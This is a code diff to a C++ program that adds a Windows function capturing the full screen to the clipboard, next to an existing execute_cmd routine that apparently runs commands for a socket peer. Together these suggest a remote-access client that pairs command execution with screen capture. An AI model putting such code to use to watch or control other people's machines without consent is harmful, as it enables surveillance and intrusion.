@@ -2,7 +2,7 @@
 * @Author: amaneureka
 * @Date:   2017-04-02 03:33:49
 * @Last Modified by:   amaneureka
-* @Last Modified time: 2017-04-04 18:23:00
+* @Last Modified time: 2017-04-04 19:33:46
 */
 
 #include <vector>
@@ -193,6 +193,56 @@ int execute_cmd(int socket, const string cmd)
     pclose(pPipe);
 
     return 0;
+}
+
+void GetScreenShot(void)
+{
+    BYTE* memory;
+    BITMAPINFO info;
+    HGDIOBJ old_obj;
+    HBITMAP hBitmap;
+    HDC hScreen, hDC;
+    int width, height;
+    BITMAPINFOHEADER infoHeader;
+
+    /* get screen dimensions */
+    width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+
+    /* info header */
+    infoHeader.biSize          = sizeof(infoHeader);
+    infoHeader.biWidth         = width;
+    infoHeader.biHeight        = height;
+    infoHeader.biPlanes        = 1;
+    infoHeader.biBitCount      = 24;
+    infoHeader.biCompression   = BI_RGB;
+    infoHeader.biSizeImage     = 0;
+    infoHeader.biXPelsPerMeter = 0;
+    infoHeader.biYPelsPerMeter = 0;
+    infoHeader.biClrUsed       = 0;
+    infoHeader.biClrImportant  = 0;
+
+    info.bmiHeader = infoHeader;
+
+    /* copy screen to bitmap */
+    hScreen = GetDC(NULL);
+    hDC     = CreateCompatibleDC(hScreen);
+    //hBitmap = CreateCompatibleBitmap(hScreen, width, height);
+    hBitmap = CreateDIBSection(hScreen, &info, DIB_RGB_COLORS, (void**)&memory, 0, 0);
+    old_obj = SelectObject(hDC, hBitmap);
+    BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
+
+    /* save bitmap to clipboard */
+    OpenClipboard(NULL);
+    EmptyClipboard();
+    SetClipboardData(CF_BITMAP, hBitmap);
+    CloseClipboard();
+
+    /* clean up */
+    SelectObject(hDC, old_obj);
+    DeleteDC(hDC);
+    ReleaseDC(NULL, hScreen);
+    DeleteObject(hBitmap);
 }
 
 int main(int argc, char *argv[])
